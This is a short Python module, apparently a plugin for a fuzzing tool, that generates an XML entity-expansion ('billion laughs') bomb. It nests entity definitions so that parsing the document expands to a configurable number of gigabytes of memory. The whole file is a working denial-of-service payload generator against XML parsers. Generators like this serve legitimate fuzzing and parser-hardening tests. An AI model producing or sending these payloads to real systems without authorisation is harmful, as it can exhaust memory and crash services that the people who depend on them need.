from options import Options
import math


options = Options()
options.add_option('mem_use', 1.0, 'Target memory use in GB')


def run(generator, output):
    if generator.INPUT_NAME != "string" and generator.INPUT_NAME != "char":
        raise ValueError("Only string or char input allowed for xml bomb.")

    if options['mem_use'] < .0001 or options['mem_use'] > 5000:
        raise ValueError("mem_use only supported for the range of [.0001, 5000] GB")

    xml = generate_xml(generator, options['mem_use'])
    output.output(xml)


def generate_xml(generator, target):
    num_places = int(math.floor(math.log(target, 10)))
    power = int(9 + num_places) # 9 for GB
    str_len = int(math.ceil(target / (10**num_places)))

    rand_seq = generator.get_random()
    if len(rand_seq) < str_len:
        str_block = rand_seq * ((str_len / len(rand_seq)) + 1)
        str_block = str_block[:str_len]
    else:
        str_block = rand_seq[:str_len]

    ret = []
    ret.append('<?xml version="1.0"?>')
    ret.append('<!DOCTYPE bombz [')
    ret.append('  <!ENTITY bomb "' + str_block + '">')
    ret.append('  <!ELEMENT bombz (#PCDATA)>')
    for i in range(power):
        if i > 0:
            line = ("&bomb" + str(i) + ";")*10
        else:
            line = ("&bomb;") * 10
        ret.append('  <!ENTITY bomb' + str(i+1) + ' "' + line + '">')
    ret.append(']>')
    ret.append('<bombz>&bomb' + str(power) + ';</bombz>')
    return ret